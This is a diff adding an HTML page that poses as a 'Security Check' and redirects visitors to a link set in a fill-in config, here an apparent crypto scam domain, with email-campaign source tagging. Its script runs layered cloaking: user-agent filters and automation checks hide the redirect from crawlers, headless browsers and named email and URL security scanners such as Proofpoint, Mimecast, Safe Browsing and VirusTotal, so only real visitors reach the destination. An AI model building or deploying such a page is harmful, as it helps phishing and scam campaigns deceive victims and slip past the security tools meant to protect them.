@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
+<title>Redirecting…</title>
+<style>
+  :root{
+    --bg1:#0b1020;
+    --bg2:#131a33;
+    --accent:#4f8cff;
+    --accent2:#7c5cff;
+    --text:#eaf0ff;
+    --muted:#8b97b8;
+    --card:rgba(255,255,255,0.04);
+    --border:rgba(255,255,255,0.08);
+  }
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+    background:
+      radial-gradient(1200px 800px at 10% -10%, rgba(124,92,255,.18), transparent 60%),
+      radial-gradient(1000px 700px at 110% 110%, rgba(79,140,255,.15), transparent 60%),
+      linear-gradient(160deg,var(--bg1),var(--bg2));
+    color:var(--text);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:24px;
+    min-height:100dvh;
+    overflow:hidden;
+  }
+  .card{
+    width:100%;
+    max-width:440px;
+    background:var(--card);
+    border:1px solid var(--border);
+    border-radius:20px;
+    padding:36px 28px 30px;
+    backdrop-filter:blur(14px);
+    -webkit-backdrop-filter:blur(14px);
+    box-shadow:0 20px 60px rgba(0,0,0,.4);
+    text-align:center;
+    animation:fade .5s ease;
+  }
+  @keyframes fade{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+
+  .logo{
+    width:56px;height:56px;margin:0 auto 18px;
+    border-radius:16px;
+    background:linear-gradient(135deg,var(--accent),var(--accent2));
+    display:flex;align-items:center;justify-content:center;
+    box-shadow:0 8px 24px rgba(79,140,255,.35);
+    font-size:26px;
+  }
+  h1{font-size:19px;font-weight:600;letter-spacing:.2px;margin-bottom:8px}
+  p.sub{color:var(--muted);font-size:13.5px;line-height:1.55;margin-bottom:24px}
+
+  .progress-wrap{
+    width:100%;height:6px;background:rgba(255,255,255,.06);
+    border-radius:99px;overflow:hidden;margin-bottom:14px;
+  }
+  .progress{
+    height:100%;width:0%;
+    background:linear-gradient(90deg,var(--accent),var(--accent2));
+    border-radius:99px;
+    transition:width .28s linear;
+  }
+  .status{
+    font-size:13px;color:var(--muted);
+    min-height:20px;
+    font-variant-numeric:tabular-nums;
+  }
+  .status b{color:var(--text)}
+
+  .btn{
+    display:none;
+    width:100%;
+    margin-top:22px;
+    padding:14px 20px;
+    border:none;border-radius:12px;
+    background:linear-gradient(135deg,var(--accent),var(--accent2));
+    color:#fff;font-size:15px;font-weight:600;
+    cursor:pointer;
+    letter-spacing:.3px;
+    transition:transform .15s ease, box-shadow .15s ease, opacity .15s;
+    box-shadow:0 10px 26px rgba(79,140,255,.35);
+  }
+  .btn:active{transform:scale(.98)}
+  .btn:hover{box-shadow:0 14px 32px rgba(79,140,255,.5)}
+  .btn.show{display:block;animation:fade .3s ease}
+
+  .hidden{display:none !important}
+  .foot{margin-top:18px;font-size:11.5px;color:var(--muted);opacity:.7}
+</style>
+</head>
+<body>
+
+<main class="card" role="main">
+  <div class="logo">🔒</div>
+  <h1>Security Check</h1>
+  <p class="sub">Verifying that you're a real user.<br>This will only take a few seconds.</p>
+
+  <div class="progress-wrap"><div class="progress" id="bar"></div></div>
+  <div class="status" id="status">Initializing…</div>
+
+  <button class="btn" id="goBtn" type="button">Continue →</button>
+
+  <div class="foot">Secure redirect · <span id="hostLabel"></span></div>
+</main>
+
+<script>
+/* ============================================================
+   CONFIG — REPLACE targetUrl WITH YOUR DESTINATION LINK
+   ============================================================ */
+const CONFIG = {
+  targetUrl: "https://dash.bitco-in-green.pro", // ← PUT YOUR LINK HERE
+  minDelay: 3000,        // minimum ms before the button appears
+  maxDelay: 5000,        // maximum ms
+  requireInteraction: true, // require mouse movement / touch
+  requireClick: true,    // require click on the button
+  autoRedirectAfter: 15000 // auto-redirect 15s after button shows (0 = off)
+};
+
+(function () {
+  "use strict";
+
+  const $bar    = document.getElementById('bar');
+  const $status = document.getElementById('status');
+  const $btn    = document.getElementById('goBtn');
+  const $host   = document.getElementById('hostLabel');
+
+  try { $host.textContent = new URL(CONFIG.targetUrl).hostname; } catch(e){ $host.textContent = 'secure.link'; }
+
+  /* ---------- LAYER 1: User-Agent filter ---------- */
+  const ua = navigator.userAgent || "";
+  const botPatterns = [
+    /bot/i, /crawler/i, /spider/i, /scraper/i,
+    /curl/i, /wget/i, /python/i, /java\//i,
+    /headless/i, /phantomjs/i, /puppeteer/i, /playwright/i,
+    /googlebot/i, /bingpreview/i, /yandexbot/i, /duckduckbot/i,
+    /facebookexternalhit/i, /slackbot/i, /telegrambot/i, /whatsapp/i,
+    /outlook-iOS/i, /ms-office/i, /microsoft office/i,
+    /googleimageproxy/i, /yahoomailproxy/i,
+    /barracuda/i, /proofpoint/i, /mimecast/i, /symantec/i, /forcepoint/i,
+    /safebrowsing/i, /urlscan/i, /virustotal/i
+  ];
+  for (const p of botPatterns) {
+    if (p.test(ua)) {
+      // Silent exit — bot sees only the "loading" state
+      $status.textContent = "Loading…";
+      return;
+    }
+  }
+
+  /* ---------- LAYER 2: webdriver / automation ---------- */
+  if (navigator.webdriver === true) return;
+  if (window.callPhantom || window._phantom || window.__nightmare) return;
+  if (navigator.plugins && navigator.plugins.length === 0 &&
+      !/mobile|android|iphone|ipad/i.test(ua)) {
+    // suspicious for desktop
+    // don't hard-block, just flag
+  }
+
+  /* ---------- LAYER 3: human interaction ---------- */
+  let interacted = false;
+  function markInteract(){ interacted = true; }
+
+  ['mousemove','touchstart','touchmove','pointerdown','keydown','scroll','click']
+    .forEach(ev => window.addEventListener(ev, markInteract, {passive:true, once:false}));
+
+  // window focus
+  let hasFocus = document.hasFocus();
+  window.addEventListener('focus', () => hasFocus = true);
+
+  /* ---------- LAYER 4: progress bar + delay ---------- */
+  const total = CONFIG.minDelay + Math.random() * (CONFIG.maxDelay - CONFIG.minDelay);
+  const start = performance.now();
+  let ready = false;
+
+  const humanCheck = setInterval(() => {
+    if (interacted && hasFocus) {
+      clearInterval(humanCheck);
+      $status.textContent = "User verified ✓";
+    }
+  }, 200);
+
+  function tick() {
+    const elapsed = performance.now() - start;
+    const pct = Math.min(100, (elapsed / total) * 100);
+    $bar.style.width = pct.toFixed(1) + "%";
+
+    const left = Math.max(0, Math.ceil((total - elapsed) / 1000));
+    if (!ready) {
+      if (interacted && hasFocus) {
+        $status.innerHTML = left > 0
+          ? `Ready in <b>${left}</b> sec…`
+          : `Check complete ✓`;
+      } else {
+        $status.textContent = "Waiting for user activity…";
+      }
+    }
+
+    if (elapsed >= total && !ready) {
+      ready = true;
+      clearInterval(humanCheck);
+      $bar.style.width = "100%";
+      $status.innerHTML = interacted && hasFocus
+        ? "You may proceed ✓"
+        : "Please confirm you're human";
+
+      if (CONFIG.requireClick) {
+        $btn.classList.add('show');
+      } else {
+        redirect();
+      }
+    } else if (!ready) {
+      requestAnimationFrame(tick);
+    }
+  }
+  requestAnimationFrame(tick);
+
+  /* ---------- LAYER 5: final click ---------- */
+  $btn.addEventListener('click', function (e) {
+    e.preventDefault();
+    if (!interacted && CONFIG.requireInteraction) {
+      $status.textContent = "Please move your mouse / finger";
+      return;
+    }
+    redirect();
+  });
+
+  /* ---------- REDIRECT ---------- */
+  let redirected = false;
+  function redirect() {
+    if (redirected) return;
+    redirected = true;
+    $bar.style.width = "100%";
+    $status.innerHTML = "Redirecting…";
+    $btn.disabled = true;
+    $btn.style.opacity = ".6";
+
+    // double safety: location.replace + small delay
+    setTimeout(() => {
+      try {
+        window.location.replace(CONFIG.targetUrl);
+      } catch (err) {
+        window.location.href = CONFIG.targetUrl;
+      }
+    }, 250);
+  }
+
+  /* ---------- LAYER 6: extra marker (optional) ---------- */
+  // Allows passing ?src=email through to the target link
+  try {
+    const params = new URLSearchParams(location.search);
+    const src = params.get('src') || params.get('utm_source') || 'email';
+    const u = new URL(CONFIG.targetUrl, location.href);
+    if (!u.searchParams.has('utm_source')) u.searchParams.set('utm_source', src);
+    CONFIG.targetUrl = u.toString();
+  } catch(e){}
+
+})();
+</script>
+</body>
+</html>
